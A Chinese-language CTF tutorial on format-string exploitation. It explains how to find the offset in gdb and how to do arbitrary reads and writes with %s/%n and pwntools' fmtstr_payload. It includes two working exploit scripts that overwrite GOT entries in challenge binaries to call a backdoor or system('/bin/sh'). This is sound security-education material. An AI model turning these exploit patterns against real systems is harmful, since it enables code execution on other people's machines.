# pwn入门--格式化字符串

## 确定偏移：

### 32位：

1. gdb中格式化字符串在栈上的位置的，**左边序号值** 就是偏移。

1. 先到printf函数的调用位置：

   ![image-20240710120200274](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101202735.png)

2. 观查栈上的数据：

   ![image-20240710120155192](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101201516.png)

 ### 64位：

1. gdb中格式化字符串在栈上的位置的，**左边序号值+6** 就是偏移（因为64位**前6个参数**要用**寄存器rdi,rsi,rdx,rcx,r8,r9**来传参，其余才用栈传参）。

1. 先到printf函数的调用位置：

   ![image-20240710120438926](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101204237.png)

2. 观察寄存器，和栈：

   ![image-20240710122358218](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101224181.png)

## 任意地址读：

1. 主要使用 **%m$s** ，来实现 **任意地址** 读取数据：

   * 先利用第一步，确定格式化字符串的**偏移为m**。
   * 然后确定要 **读取** 的数据地址：**p** (0x80504) ,
   * 最后构造，以字符串的形式输出地址为0x80504的值（%s会将0x80504当成地址去解析）：

   ```python
   payload = p64(0x80504)+b"%m$s"
   ```



## 任意地址写：

1. 主要使用 **%m$n** ，来实现 **任意地址** 写入数据。

2. 使用工具 **fmtstr_payload** 快速钩爪格式化字符串：

   * 先利用第一步，确定格式化字符串的**偏移为m**。
   * 然后确定要 **写入** 的数据地址：**p** (0x80504) 。
   * %n会将printf函数**已经输出的字符个数num**，写入到地址0x80504处：

   ```python
   payload = p32(0x80504) + b"a"*(num-4) + b"%m$n"
   ```

   * 使用 **fmtstr_payload** 工具快速构造;

     ```python
     payload = fmtstr_payload(offset,{write_addr:write_data},numbwritten=0)
     ```

     **offset** ：格式化字符串的偏移

     **write_addr** ：要写入的地址

     **write_data** ：要写如的值

     **numbwritten** :print**f已经输出**的字符个数

## 例题1：

1. 挟持got表

``````python
from pwn import *
# from LibcSearcher import *
context(os='linux', arch='i386', log_level='debug')

p=remote("node5.anna.nssctf.cn",24575)
# p = process("./pwn")
elf = ELF("./pwn")

read_got = elf.got["read"]
success("read_got==>"+hex(read_got))
backdoor = elf.symbols["backdoor"]
print(hex(backdoor))
payload = fmtstr_payload(11,{read_got:backdoor})
p.sendline(payload)
p.sendline(b'cat flag')
p.interactive()


``````

## 例题2：

地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#axb_2019_fmt32)

注意点：格式化字符串在**栈上对齐**。

1. 题目只有一个格式化字符串，没有栈溢出，所以只能考虑挟持got表：

   ![image-20240710172120217](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101721507.png)

2. gdb调试，确定格式化字符串偏移，注意栈对齐：

   ![image-20240710172537479](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101725012.png)

3. 确定格式化字符串已经输出的字符个数：

   ![image-20240710172833648](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101728747.png)

4. EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='i386', log_level='debug')
   
   # p=remote("node5.buuoj.cn",26396)
   p = process("./pwn")
   elf = ELF("./pwn")
   puts_addr = elf.got["puts"]
   strlen_addr = elf.got["strlen"]
   
   p.recv()
   payload = b'a'+p32(puts_addr)+b"%8$s"
   p.sendline(payload)
   p.recvuntil(p32(puts_addr))
   addr = u32(p.recv(4))
   success("puts_addr==>"+hex(addr))
   
   libc_addr = addr-0x5fcb0
   sys_addr = libc_addr+0x3adb0
   success("libc_addr==>"+hex(libc_addr))
   success("sys_addr==>"+hex(sys_addr))
   
   payload = b"a" + fmtstr_payload(8,{strlen_addr:sys_addr},10)
   print(payload)
   p.sendline(payload)
   p.sendline(b';/bin/sh')		#切割前面的字符，形成system("/bin/sh")
   p.sendline(b'cat flag')
   p.interactive()
   ```

   成功拿到本地flag：

   ![image-20240710172924720](https://gitee.com/poppy-qwq/cloudimage/raw/master/img/202407101729867.png)

